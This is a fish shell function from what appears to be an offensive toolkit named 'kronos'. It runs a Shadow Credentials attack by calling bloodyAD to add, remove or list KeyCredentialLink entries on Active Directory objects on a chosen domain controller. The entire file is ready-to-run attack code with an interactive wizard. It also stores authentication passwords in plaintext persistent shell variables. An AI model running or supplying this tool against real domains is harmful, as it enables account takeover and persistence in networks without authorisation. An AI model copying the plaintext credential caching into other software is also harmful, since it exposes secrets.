# description: Shadow Credentials attack (KeyCredentialLink)
function __kronos_shadow_credentials --description "Shadow Credentials attack (KeyCredentialLink)"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse h/help q/quiet u/username= p/password= k/kerberos t/target-object= a/action= w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos shadow-credentials [TARGET_DC] [OPTIONS]"
        echo ""
        echo "Perform Shadow Credentials attack (KeyCredentialLink) using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target-object NAME Target AD object (e.g. 'web01\$' or 'p.user')"
        echo "  -a, --action ACTION      Action (add, remove, list) - default: add"
        echo "  -u, --username USER      Auth username"
        echo "  -p, --password PASS      Auth password"
        echo "  -k, --kerberos           Use Kerberos authentication"
        echo "  -q, --quiet              Skip prompts and use fallbacks/cached values"
        echo "  -h, --help               Show this help message"
        return 0
    end

    set -l target $argv[1]
    set -l target_obj $_flag_target_object
    set -l action $_flag_action
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password

    # Load defaults
    if test -z "$target"
        set target $__KRONOS_CACHE_SHADOW_TARGET
        if test -z "$target"; set target $TGT_DC_IP; end
        if test -z "$target"; set target $TGT_DC; end
        if test -z "$target"; set target $TGT; end
    end
    if test -z "$target_obj"; set target_obj $__KRONOS_CACHE_SHADOW_OBJ; end
    if test -z "$action"; set action $__KRONOS_CACHE_SHADOW_ACTION; end
    if test -z "$action"; set action "add"; end

    if test -z "$auth_user"
        set auth_user $__KRONOS_CACHE_SHADOW_AUTH_USER
        if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
    end
    if test -z "$auth_pass"
        set auth_pass $__KRONOS_CACHE_SHADOW_AUTH_PASS
        if test -z "$auth_pass"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end
    end

    if not set -q _flag_quiet
        set_color cyan; echo "[*] Starting Shadow Credentials wizard..."; set_color normal

        set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
        set -U __KRONOS_CACHE_SHADOW_TARGET "$target"

        set target_obj (__kronos_ask "Target Object (e.g. web01\$)" "$target_obj"); or return 1
        set -U __KRONOS_CACHE_SHADOW_OBJ "$target_obj"

        set action (__kronos_ask_choice "Action" "$action" add remove list); or return 1
        set -U __KRONOS_CACHE_SHADOW_ACTION "$action"

        if not set -q _flag_kerberos
            set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
            set -U __KRONOS_CACHE_SHADOW_AUTH_USER "$auth_user"

            set auth_pass (__kronos_ask "Auth Password" "$auth_pass"); or return 1
            set -U __KRONOS_CACHE_SHADOW_AUTH_PASS "$auth_pass"
        end

        # Confirmation
        echo ""
        echo "Configuration:"
        echo "  Target: $target"
        echo "  Object: $target_obj"
        echo "  Action: $action"
        echo "  Auth:   "(set -q _flag_kerberos; and echo "Kerberos"; or echo "$auth_user")
        echo ""
        if test (__kronos_ask_confirm "Proceed with Shadow Credentials $action on $target_obj?" n) != "yes"
            echo "Aborted."
            return 1
        end
    end

    if test -z "$target"; echo "error: target is required"; return 1; end
    if test -z "$target_obj"; echo "error: target object is required"; return 1; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    set -l cmd_str bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_str -k
    else
        if test -z "$auth_user"
            echo "error: auth credentials required" >&2
            return 1
        end
        set -a cmd_str -u "$auth_user" -p "$auth_pass"
    end

    set -a cmd_str $action shadowCredentials "$target_obj"

    __kronos_check_dep bloodyAD; or return 1

    echo "[*] Performing Shadow Credentials $action on $target_obj via bloodyAD..."
    command $cmd_str
end
